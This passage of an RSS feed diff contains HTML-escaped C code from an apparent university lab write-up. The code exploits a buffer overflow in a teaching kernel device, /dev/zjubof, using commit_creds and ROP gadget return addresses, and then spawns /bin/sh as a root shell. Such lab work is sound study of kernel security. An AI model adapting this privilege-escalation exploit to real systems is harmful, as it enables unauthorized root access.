+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">72&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">commitCredsRA&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">secondLevelGadgetRA&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">RAOfSecondLevelGadget&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">offset&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">104&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">secondLevelGadgetRA&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">ZJUBofWriteRA&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">RAOfZJUBofWrite&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">offset&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">152&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">ZJUBofWriteRA&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">160&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">system&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/bin/sh&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">argc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">[])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">fd&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/dev/zjubof&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">O_RDWR&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">offset&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">getOffset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fd&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">hackUsingFirstLevelGadget&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">offset&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// hackUsingROP(fd, offset);
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;blockquote>
+&lt;p>Written by Jiacheng Hu, at Zhejiang University, Hangzhou, China.&lt;/p>
+&lt;/blockquote></description></item></channel></rss>
